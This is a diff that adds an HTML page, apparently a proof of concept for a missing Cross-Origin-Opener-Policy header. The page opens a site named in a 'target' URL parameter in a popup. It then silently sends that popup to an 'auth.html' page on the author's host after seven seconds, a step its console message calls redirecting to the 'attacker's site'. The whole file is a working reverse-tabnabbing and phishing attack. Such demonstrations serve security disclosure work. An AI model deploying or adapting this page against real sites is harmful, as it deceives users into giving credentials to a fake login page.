@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto-Redirect</title>
+    <style>
+        body {
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            font-family: Arial, sans-serif;
+            height: 100vh;
+            margin: 0;
+        }
+        #message {
+            color: black;
+            font-size: 18px;
+            max-width: 600px;
+        }
+    </style>
+    <script>
+        function getParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param) || "https://du4l5ynche1n.github.io/missing-coop/";
+        }
+
+        function redirect() {
+            const target = getParam("target");
+            const newWindow = window.open(target, "popup", "");
+            console.log(`Opened ${target}`);
+            
+            setTimeout(() => {
+                console.log("Redirecting to attacker's site");
+                newWindow.location.href = "https://du4l5ynche1n.github.io/missing-coop/auth.html";
+            }, 7000);
+        }
+
+        function initialize() {
+            const target = getParam("target");
+            document.body.addEventListener("click", redirect);
+            
+            const message = document.createElement("div");
+            message.id = "message";
+            message.innerText = `If the site did not automatically redirect to ${target}, click anywhere to proceed.`;
+            document.body.appendChild(message);
+
+            redirect();
+        }
+
+        window.onload = initialize;
+    </script>
+</head>
+<body>
+</body>
+</html>
